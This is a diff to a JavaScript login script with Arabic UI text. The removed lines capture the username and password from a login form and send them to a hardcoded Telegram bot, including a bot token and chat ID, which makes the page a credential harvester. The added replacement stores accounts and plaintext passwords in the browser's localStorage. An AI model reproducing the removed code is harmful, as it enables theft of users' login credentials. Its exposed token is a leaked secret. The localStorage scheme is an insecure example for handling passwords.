@@ -1,23 +1,40 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
+document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
 
-    const botToken = '8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y'; // ضع رمز بوت تيليجرام هنا
-    const chatId = '7302541527'; // ضع معرف الشات الخاص بك هنا
+    if (loginForm) {
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const users = JSON.parse(localStorage.getItem('users')) || [];
 
-    const message = `🔐 تسجيل دخول جديد:\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                alert('تم تسجيل الدخول وإرسال البيانات إلى تيليجرام!');
-                window.location.href = 'index.html';
+            const user = users.find(user => user.username === username && user.password === password);
+            if (user) {
+                localStorage.setItem('user', JSON.stringify(user));
+                window.location.href = "index.html";
             } else {
-                alert('حدث خطأ أثناء إرسال البيانات.');
+                alert('خطأ في تسجيل الدخول');
             }
-        })
-        .catch(error => console.error('Error:', error));
+        });
+    }
+
+    if (registerForm) {
+        registerForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const newUsername = document.getElementById('newUsername').value;
+            const newPassword = document.getElementById('newPassword').value;
+
+            let users = JSON.parse(localStorage.getItem('users')) || [];
+            if (users.some(user => user.username === newUsername)) {
+                alert('اسم المستخدم موجود بالفعل');
+                return;
+            }
+
+            users.push({ username: newUsername, password: newPassword });
+            localStorage.setItem('users', JSON.stringify(users));
+            alert('تم التسجيل بنجاح!');
+            window.location.href = "login.html";
+        });
+    }
 });
